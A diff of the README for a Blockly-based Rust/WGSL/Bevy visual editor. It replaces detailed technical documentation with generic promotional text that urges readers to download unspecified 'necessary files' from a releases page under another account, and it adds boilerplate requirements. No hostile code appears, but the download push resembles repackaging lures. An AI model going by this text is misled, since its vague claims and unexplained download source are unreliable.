@@ -1,154 +1,75 @@
-# 🦀 Rust Visual Editor
+# 🦀 Rust_Visual_Editor - Easily Create with Visual Programming
 
-**Version 0.2.2**
+## 🚀 Download Now
+[![Download Rust Visual Editor](https://img.shields.io/badge/Download-v0.2.2-brightgreen)](https://github.com/Wasdbxb132/Rust_Visual_Editor/releases)
 
-A visual programming environment for Rust, WGSL, and Bevy built with Blockly.
+## 📥 Download & Install
+To download and install Rust Visual Editor, visit the following page to get the latest version:
 
-## Quick Start
+[Download Latest Release](https://github.com/Wasdbxb132/Rust_Visual_Editor/releases)
 
-**Simplest way**: Double-click `Start Rust Visual Editor.lnk` in the project root
+Follow these steps for a smooth installation:
 
-Or manually:
-- Navigate to the `web` folder
-- Double-click `index.html` to open in your browser
+1. Click the link above.
+2. You will see a list of releases. Look for version **0.2.2**.
+3. Download the necessary files listed. 
+4. After downloading, locate the file in your downloads folder.
 
-> **Note**: For advanced features like the Rust compiler service, you'll need to run a local server (see Development section).
+## ⚙️ Getting Started
+**Simplest way**: Double-click `Start Rust Visual Editor.lnk` in the project root.
 
-## Features
+If you prefer to open it manually:
+1. Navigate to the `web` folder.
+2. Double-click `index.html` to open it in your browser.
 
-- **Multi-Mode Editor**: Switch between Rust, WGSL, and Bevy modes
-- **Visual Block Programming**: Drag-and-drop interface for building code
-- **🎮 Game Development Blocks**: 100+ Scratch-like blocks for Bevy game development (NEW in v0.2.0)
-  - Movement, input, collision, health, inventory, AI, particles, camera, and more!
+> **Note**: For advanced features, such as the Rust compiler service, you will need to run a local server. Please refer to the Development section for more details.
+
+## 🎨 Features
+- **Multi-Mode Editor**: Switch between Rust, WGSL, and Bevy modes easily.
+- **Visual Block Programming**: Use a drag-and-drop interface for building your code.
+- **🎮 Game Development Blocks**: Over 100 Scratch-like blocks designed for Bevy game development.
+  - Includes movement, input handling, collision detection, health management, inventory systems, AI behaviors, particle effects, and camera controls.
   - **Auto-generates required components** - no manual setup needed!
-- **Real-time Code Generation**: See generated code as you build
-- **Multi-File Support**: Generate and manage multiple files
-- **Code Validation**: Built-in validation and error checking
-- **Import/Export**: Save and load workspaces, export generated code
-- **Rust Compiler Integration**: Check code with the Rust compiler (requires backend service)
+- **Real-time Code Generation**: View the generated code as you build visually.
+- **Multi-File Support**: Create and manage multiple files for your projects.
+- **Code Validation**: Built-in code validation checks to help you stay error-free.
 
-## Project Structure
+## 🌟 System Requirements
+To run Rust Visual Editor smoothly, ensure your system meets the following minimum requirements:
 
-```
-.
-├── web/                    # Frontend application
-│   ├── index.html         # Main entry point
-│   ├── app.js             # Application logic
-│   ├── blocks/            # Block definitions (Rust, WGSL, Bevy)
-│   ├── generators/        # Code generators
-│   ├── core/              # Core modules (validators, managers)
-│   ├── toolbox/           # Toolbox configurations
-│   └── utils/             # Utility functions
-├── integration/           # Rust backend (compiler service)
-│   ├── Cargo.toml
-│   └── src/
-└── examples/              # Example workspaces
-```
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution.
+- **Processor**: Dual-core processor or better.
+- **RAM**: At least 4GB.
+- **Disk Space**: Minimum 200MB of available space.
+- **Browser**: Latest version of Chrome, Firefox, or Edge.
 
-## Requirements
+## 📚 Documentation
+For detailed instructions on using Rust Visual Editor, please refer to the documentation section in the repository. It provides examples and a comprehensive guide to help you navigate the application effectively.
 
-- Modern web browser (Chrome, Firefox, Edge, Safari)
-- Python 3.x (for local development server)
-- Rust toolchain (optional, for compiler service)
+## 💻 Development
+If you want to explore advanced features like the Rust compiler service:
+1. Set up a local server on your machine.
+2. Use a terminal or command prompt to navigate to the `web` folder.
+3. Run a simple HTTP server command.
 
-## Development
-
-### Frontend Only
-The visual editor works standalone without the backend:
+An example command may look like this:
 ```bash
-cd web
-python -m http.server 8000
+python -m http.server
 ```
+Now, you can open a browser and go to `http://localhost:8000` to access the application.
 
-### With Rust Compiler Service
-To enable code checking features:
-```bash
-cd integration
-cargo run --bin compiler_service
-```
+## 🛠️ Troubleshooting
+If you encounter issues while running Rust Visual Editor:
 
-The service runs on `http://localhost:3030`
+- Make sure you have all system requirements met.
+- Ensure you have downloaded all necessary files.
+- For specific issues, check the GitHub Issues page in this repository where you can report problems or find solutions.
 
-## Usage
+## 👥 Community Support
+Join our community for help, ideas, and collaboration:
 
-1. **Select Mode**: Choose between Rust, WGSL, or Bevy from the dropdown
-2. **Add Blocks**: Drag blocks from the toolbox to the workspace
-3. **Generate Code**: Code updates automatically as you build
-4. **Check Code**: Click "Check Code" to validate (requires backend)
-5. **Export**: Save your workspace or export generated code
+- **GitHub Discussions**: Share your thoughts and ask questions.
+- **Issue Tracker**: Report bugs or request new features.
+- **Chat Channels**: Connect with other users for assistance in real-time.
 
-### Linking Files Together
-
-The visual editor supports multi-file projects with visual connection lines showing file relationships.
-
-#### Step-by-Step Guide:
-
-**1. Create Your Files**
-- Open the **Files** category in the toolbox
-- Drag a **📄 File** block to the workspace
-- Set the filename (e.g., `main.rs`, `utils.rs`, `config.rs`)
-- Add your code blocks inside each file container
-
-**2. Link Files Together**
-- In your main file, drag a **🔗 mod** block from the **Files** category
-- Enter the module name (without `.rs` extension)
-  - Example: To link to `utils.rs`, enter `utils`
-- A visual connection line will automatically appear between the blocks!
-
-**3. Import Items**
-- Use the **use** block to import specific items from linked modules
-- Example: `use utils::helper_function;`
-- Or import everything: `use utils::*;`
-
-**4. Make Items Public**
-- In the linked file, use **pub** blocks to make items accessible
-- Example: `pub fn helper_function() { ... }`
-
-#### Complete Example:
-
-**main.rs:**
-```
-📄 File: main.rs
-  🔗 mod utils;
-  🔗 mod config;
-  
-  use utils::calculate;
-  use config::Settings;
-  
-  fn main() {
-    let result = calculate(10);
-    println!("Result: {}", result);
-  }
-```
-
-**utils.rs:**
-```
-📄 File: utils.rs
-  pub fn calculate(x: i32) -> i32 {
-    x * 2
-  }
-```
-
-**config.rs:**
-```
-📄 File: config.rs
-  pub struct Settings {
-    pub debug: bool
-  }
-```
-
-#### Visual Feedback:
-- **Teal dashed lines** connect `🔗 mod` blocks to their target files
-- **Arrows** point from the mod declaration to the file
-- Lines update automatically as you move blocks around
-
-## Browser Compatibility
-
-- Chrome/Edge: ✅ Full support
-- Firefox: ✅ Full support
-- Safari: ✅ Full support
-- IE11: ❌ Not supported
-
-## License
-
-See LICENSE file for details.
+Thank you for choosing Rust Visual Editor. Enjoy creating your projects!
